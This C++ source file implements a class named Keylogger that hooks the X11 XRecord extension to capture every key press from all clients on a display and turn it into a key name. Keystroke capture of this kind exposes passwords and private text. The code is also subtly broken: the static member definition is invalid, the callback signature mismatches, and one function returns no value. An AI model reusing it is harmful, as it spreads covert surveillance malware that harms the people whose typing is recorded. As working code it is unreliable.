//
// Keylogger.cpp for Keylogger class in /home/vianney
// 
// Made by Vianney Bouchaud
// Login   <vianney@bouchaud.org>
// 
// Started on  Wed Oct  5 13:58:25 2011 Vianney Bouchaud
// Last update Thu Oct  6 19:03:44 2011 Vianney Bouchaud
//

#include	<string>
#include	"Keylogger.hpp"

Keylogger::Keylogger()
{
}

Keylogger::~Keylogger()
{
  stop();
}

void		Keylogger::start()
{
  if (!XRecordEnableContextAsync(userData.dataDisplay, recContext, eventCallback, (XPointer) &userData))
    throw exception();
}

void		Keylogger::stop()
{
  if(!XRecordDisableContext(userData.ctrlDisplay, recContext))
    throw exception();
}

void		Keylogger::setupRecordExtension()
{
  XSynchronize(userData.ctrlDisplay, True);
  if (!XRecordQueryVersion(userData.ctrlDisplay, &recVer.first, &recVer.second))
    throw exception();
  recRange = XRecordAllocRange();
  if (!recRange)
    throw exception();
  recRange->device_events.first = KeyPress;
  recRange->device_events.last = KeyPress;
  recClientSpec = XRecordAllClients;
  recContext = XRecordCreateContext(userData.ctrlDisplay, 0, &recClientSpec, 1, &recRange, 1);
  if (!recContext)
    throw exception();
}

void		Keylogger::processData()
{
  XRecordProcessReplies(userData.dataDisplay);
}

bool		Keylogger::xConnect(string displayName)
{
  m_displayName = displayName;
  if (NULL == (userData.ctrlDisplay = XOpenDisplay(m_displayName.c_str())))
    return (false);
  if (NULL == (userData.dataDisplay = XOpenDisplay(m_displayName.c_str())))
    {
      XCloseDisplay(userData.ctrlDisplay);
      userData.ctrlDisplay = NULL;
      return (false);
    }
  userData.initialObject = (void *)this;
  setupRecordExtension();
  return (true);
}

static std::string	&Keylogger::eventCallback(XPointer priv, XRecordInterceptData *hook, std::string &solv)
{
  if (hook->category != XRecordFromServer)
    {
      XRecordFreeData(hook);
      return;
    }
  CallbackClosure *userData = (CallbackClosure *)priv;
  XRecordDatum *data = (XRecordDatum *) hook->data;
  if(data->event.u.u.type == KeyPress)
    {
      int c = data->event.u.u.detail;
      solv = XKeysymToString(XKeycodeToKeysym(userData->ctrlDisplay, c, 0));
    }
  XRecordFreeData(hook);
  return (solv);
}
